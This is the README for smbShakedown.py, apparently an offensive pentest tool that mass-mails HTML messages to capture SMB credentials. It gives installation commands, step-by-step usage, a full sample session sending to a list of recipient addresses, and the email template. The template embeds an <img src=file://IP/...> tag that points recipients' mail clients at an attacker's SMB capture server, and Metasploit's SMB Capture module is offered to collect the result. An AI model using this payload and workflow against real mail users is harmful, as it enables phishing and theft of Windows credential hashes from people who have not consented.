#smbShakedown.py
    Description: A simplified SMB Email Client Attack script used for pentests.
    Created by: Nick Sanzotta / @beamr
    Version: smbShakedown.py v 1.9222016
  
***  
Installation:

    git clone https://github.com/NickSanzotta/smbShakedown.git
    cd smbShakedown/
    python smbShakedown.py

***
Usage:

    1.Enter SMTP Server address:
    
    2.Enter SMTP Server credentials: 
    (anonymous connections not supported.)
    
    3.Configure "from" and "to" addresses:
    (TIP: For multiple addresses, enter a file or seperate with a comma)
    
    4.Enter SMBCapture Server IP address, so it can be placed in body of email:
    EX: <img src=file://127.0.0.1/image/foo.gif>
    
    5. Choose whether or not to launch Metasploit's SMB Capture server.

***
Example:
       
	External IP: 100.100.100.100
	Internal IP: 10.37.242.7
	
	
	Enter SMTP Server address[smtp.gmail.com]: 
	ENTERED: "smtp.gmail.com"
	
	Enter your SMTP Server Port[587]: 
	ENTERED: "587"
	
	Enter SMTP Server username[user@gmail.com]: user@gmail.com
	ENTERED: "user@gmail.com"
	
	Enter SMTP Server password: 
	
	
	Enter SMB Capture Server IP address[10.37.242.7]: 
	ENTERED:10.37.242.7
	
	Enter "from name":[Tester]
	ENTERED:Tester
	
	Enter "from address":[user@gmail.com]
	ENTERED:user@gmail.com
	
	Enter recipient(s) name[Client]: Client
	ENTERED:Client
	
	TIP: For multiple addresses, enter a file or seperate with a comma
	EX:/opt/emailAddresses.txt or user1@company.com,user2@company.com
	Enter recipient addresses[File or individual email(s)]): /opt/emailAddresses.txt
	ENTERED:/opt/emailAddresses.txt
	
	ENTERED:['user1@company.com', 'user2@company.com']
	
	Email Message Template Below:
	From: Tester <user@gmail.com>
	To: Client <['user1@company.com', 'user2@company.com']>
	MIME-Version: 1.0
	Content-type: text/html
	Subject: smbShakedown.py test.
	
	
	...
	<b>smbShakedown.py test message.</b>
	<br>
	<img src=file://100.100.100.100/image/foo.gif>
	
	Testing Connection to your SMTP Server...
	('SMTP Server Status: ', 250)
	Connection to SMTP Server is successful, would you like to send mail now?[yes]:yes
	ENTERED: "yes"
	
	Message(s) sent!
	no
	Launch Metasploit's SMB Capture module?[yes]:no
	ENTERED: "no"
	
	Ok, remember to setup your SMBCapture Server elsewhere. 


***        
To update email template modify the following in source:
Becareful not to remove the variables {0},{1},{2} and {3}

    ### EDIT: Email Message Template Below ###
	message = """From: {0} <{1}>
    To: {2}
    MIME-Version: 1.0
    Content-type: text/html
    Subject: smbShakedown.py test.


    ...
    <b>smbShakedown.py test message.</b>
    <br>
    <img src=file://{3}/image/foo.gif>
    """
    ##########################################################

***
To do:

	Add error handling.


